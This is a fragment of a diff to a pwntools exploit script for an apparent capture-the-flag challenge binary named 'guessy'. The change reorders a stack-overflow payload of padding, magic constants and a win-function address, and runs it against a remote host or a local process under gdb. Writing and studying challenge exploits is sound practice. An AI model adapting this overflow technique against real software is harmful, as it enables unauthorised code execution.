@@ -14,14 +14,14 @@ if len(sys.argv) == 3:
     p = remote(sys.argv[1], int(sys.argv[2]))
 else:
     p = process('./guessy')
-    gdb.attach(p, 'b *main')
+    gdb.attach(p, 'b *main, *vuln')
 
     p.recvuntil('!')
-    p.sendline(b'A'*36
-        + p32(e.sym.all_I_do_is_win)
-        + p32(0xFEA51B1E)
-        + p32(0xACCE5515)
+    p.sendline(b'A'*32
         + p32(0x600DC0DE)
+        + p32(0xACCE5515)
+        + p32(0xFEA51B1E)
+        + p32(e.sym.all_I_do_is_win)
         )
     out = p.recvall()
     if b'flag' in out or b'Not quite.' in out:
